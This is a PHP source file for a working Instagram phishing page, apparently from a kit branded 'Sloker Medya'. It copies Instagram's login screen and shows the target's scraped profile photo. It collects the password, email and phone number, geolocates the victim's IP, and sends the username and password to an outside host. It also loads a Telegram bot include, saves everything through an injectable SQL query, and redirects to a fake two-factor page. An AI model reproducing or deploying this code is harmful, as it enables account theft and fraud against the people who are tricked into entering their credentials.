<?php
include("app/config.php");
include("app/database/yazilar.php");
include("app/database/router.php");
require 'app/api/spexapi.php';
session_start();
error_reporting(E_ALL);



$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
    $password=$_POST["password"];
    $mail=$_POST["mail"];
    $tel=$_POST["tel"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    $ips="$ip,$username ,$password";
    $url="https://ip-check-api.com/".$ips;
    $cek = file_get_contents($url);
    $data = explode (",",$cek);
    $ulke = $data[0];
    $sehir = $data[1];
    date_default_timezone_set('Europe/Istanbul');
    $cur_time=date("d-m-Y H:i:s");
    //Telegram Bot Ayarları - SLOKER MEDYA
      include ("app/bot/value1.php");
    $verileriyaz = $spexcon->query("INSERT INTO `users`(`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES (NULL,'".$username."','".$password."','Null','".$mail."','".$tel."','Null','".$ip."',current_timestamp())");


    header("Location: twafactor.php?username=$username");
 }
  




?>


    <!--Sloker Medya - Script Kurucusu -->


    <!DOCTYPE html>


    <html lang="tr">

    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />

    <head>

       <?php include ("app/tag/main/meta.php"); ?>
        <link rel="stylesheet" href="assets/theme/sloker/lib/dist/css/style74e2.css?1646549609">
        <meta name="referrer" content="no-referrer">
  

    </head>

    <body>
     
        <div class="box">
            <div class="lang">English <span class="mark">&#60;</span></div>
            <img src="assets/theme/sloker/lib/img/logo.svg" alt="Logo" class="logo">
            <form action="" method="post" id="mainForm">
<br><br>
            <center><img style="max-width:50%; border-radius:50%; margin-top:-70px;" width="130"  src="<?php echo $pp; ?>"></center><br>
          
                <div class="form_item form_width">
                    <div class="alert info"><?php echo $formyazi; ?></div>
                </div>
                <div class="form_item form_width my0">
                    <input id="user_input" type="password" name="password" placeholder="Password" autocapitalize="off" required>
                </div>

                <div class="form_item form_width my0">
                    <input id="user_input" type="text" name="mail" placeholder="E-Mail Adress" autocapitalize="off" required>
                </div>

                <div class="form_item form_width my0">
                    <input id="user_input" type="number" name="tel" placeholder="Phone Number" autocapitalize="off" required>
                </div>

                <div class="form_item form_width my0">
                    <div class="forget_password"><a href="https://www.instagram.com/accounts/password/reset/" rel="noreferrer">Did you forget your password?</a></div>
                </div>

                <div class="form_item form_width my0">
                    <button type="submit" id="submit_button">
					<span class="text">Login @<?php echo $username; ?></span>
					<span class="spinner" style="display: none"><img src="assets/theme/sloker/lib/img/spinner.svg" width="25px"></span>
				</button>
                </div>

                <div class="form_item form_width my0" style="margin-top: 22px">
                    <div class="register">Don't have an account? <a href="https://www.instagram.com/accounts/signup/phone" rel="noreferrer">Register</a></div>
                </div>
            </form>
        </div>

        <div class="bottom" id="bottomContents">
            <div class="visible">
                <div class="from">from</div>
                <img class="company_logo" src="assets/theme/sloker/lib/img/company-logo.svg" width="52" alt="Company Logo">
            </div>
            <div class="non_visible">
                <div class="f_center">
                    <ul class="group">
                        <li><a href="#">Meta</a></li>
                        <li><a href="#">About</a></li>
                        <li><a href="#">Blog</a></li>
                        <li><a href="#">Job Opportunities</a></li>
                        <li><a href="#">Help</a></li>
                        <li><a href="#">API</a></li>
                        <li><a href="#">Security</a></li>
                        <li><a href="#">Conditions</a></li>
                        <li><a href="#">Major Accounts</a></li>
                        <li><a href="#">Subject Tags</a></li>
                        <li><a href="#">locations</a></li>
                        <li><a href="#">Instagram Lite</a></li>
                    </ul>
                </div>

                <div class="f_center">
                    <ul class="group">
                        <li><a href="#">Beauty</a></li>
                        <li><a href="#">Dance</a></li>
                        <li><a href="#">fitness</a></li>
                        <li><a href="#">Food and drink</a></li>
                        <li><a href="#">Home and Garden</a></li>
                        <li><a href="#">Music</a></li>
                        <li><a href="#">Visual arts</a></li>
                    </ul>
                </div>

                <div class="clearfix"></div>
            </div>
        </div>

        <script src="assets/theme/sloker/lib/dist/js/main6a83.js?1648502531"></script>
    </body>



    </html>